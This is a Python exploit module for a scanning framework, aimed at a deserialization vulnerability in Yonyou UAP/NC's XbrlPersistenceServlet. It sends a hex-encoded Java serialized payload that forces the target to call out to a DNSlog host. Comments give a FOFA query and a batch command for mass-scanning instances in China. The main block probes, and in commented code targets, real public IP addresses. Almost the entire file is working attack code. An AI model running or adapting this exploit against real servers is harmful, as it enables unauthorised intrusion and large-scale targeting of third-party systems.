# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-09-08 16:30

from core.data import gLogger
from core.utils.dnslog import eyes_dnslog_verify, get_eyes_identifier
from exploit.scripts import BaseScript
from core.myenums import BugType, BugLevel
from core.request.asynchttp import *
from binascii import hexlify


# fofa: 用友 && country="CN"
# python3 batch.py -m exploit.scripts.OA.yonyou.uap.deserialize_XbrlPersistenceServlet -cs -fs "icon_hash=\"1085941792\""

class Script(BaseScript):
    name = 'yonyou-uap'

    def __init__(self, target):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bug_level = BugLevel.HIGH
        # 类型
        self.bug_type = BugType.DESERIALIZE
        # 编号
        self.bug_number = ''
        # 来源
        self.bug_refer = ''
        # 特定路径判断
        self.detect_path_list = ['/']
        # exec
        self.exec_path_list = ['/service/~xbrl/XbrlPersistenceServlet']
        # 相关信息
        self.info = r'''about version NC 6.5 2021年hw
        漏洞地址：/servlet/~uapxbrl/uap.xbrl.persistenceImpl.XbrlPersistenceServlet
        漏洞文件：modules\uapxbrl\META-INF\lib\uapxbrl_uapxbrlLevel-1.jar
        漏洞类：uap.xbrl.persistenceImpl.XbrlPersistenceServlet
        '''

    async def detect(self):
        async with aiohttp.ClientSession() as session:
            for detect_path in self.detect_path_list:
                url = f'http://{self.target}{detect_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{detect_path}'
                text = await AsyncFetcher.fetch(session=session, url=url, headers=self.headers, timeout=self.req_timeout)
                if '../Client/Uclient/UClient.dmg' in text:
                    self.flag = True
                    gLogger.myscan_info('[{} {}] {}'.format(self.name, BugType.FINGER, url))
                    return {'name': '{} {}'.format(self.name, BugType.FINGER), 'url': url, 'software': self.name}

    async def exec(self):
        async with aiohttp.ClientSession() as session:
            for exec_path in self.exec_path_list:
                verify_random_int = random.randint(10000, 99999)
                # dns_log = r''.join((r'\x%2x' % ord(c)for c in '{}.9999.eyes.sh'.format(verify_random_int)))
                dns_log = '{}.{}'.format(verify_random_int, get_eyes_identifier())
                url = f'http://{self.target}{exec_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{exec_path}'
                data = 'aced0005737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000c770800000010000000017372000c6a6176612e6e65742e55524c962537361afce47203000749000868617368436f6465490004706f72744c0009617574686f726974797400124c6a6176612f6c616e672f537472696e673b4c000466696c6571007e00034c0004686f737471007e00034c000870726f746f636f6c71007e00034c000372656671007e00037870ffffffff00000050740011' + hexlify(dns_log.encode()).decode() + '3a383074000074000e' + hexlify(dns_log.encode()).decode() + "740004687474707078740018687474703a2f2f" + hexlify(dns_log.encode()).decode() + "3a383078"
                data = bytes.fromhex(data)
                await AsyncFetcher.post_fetch(session=session, url=url, data=data, headers=self.headers, timeout=self.req_timeout)
                await asyncio.sleep(2)
                text = await eyes_dnslog_verify('dns', verify_random_int)
                if text is not None and text:
                    gLogger.myscan_info('[{} {} Verify:{}] {}'.format(self.name, self.bug_type, verify_random_int, url))
                    return {'name': '{} XbrlPersistenceServlet Verify:{}'.format(self.name, verify_random_int), 'url': url, 'software': self.name}


if __name__ == '__main__':
    import requests
    import hashlib

    resp = requests.get('https://50.84.113.154:8443/favicon.ico', verify=False)
    if resp.status_code == 200:
        m1 = hashlib.md5()
        m1.update(resp.content)
        theMD5 = m1.hexdigest()
        print(theMD5)

    # sem = asyncio.Semaphore(500)
    # sc = Script('61.150.65.205:9999', 1, sem)
    # l = asyncio.get_event_loop()
    # l.run_until_complete(sc.attack())
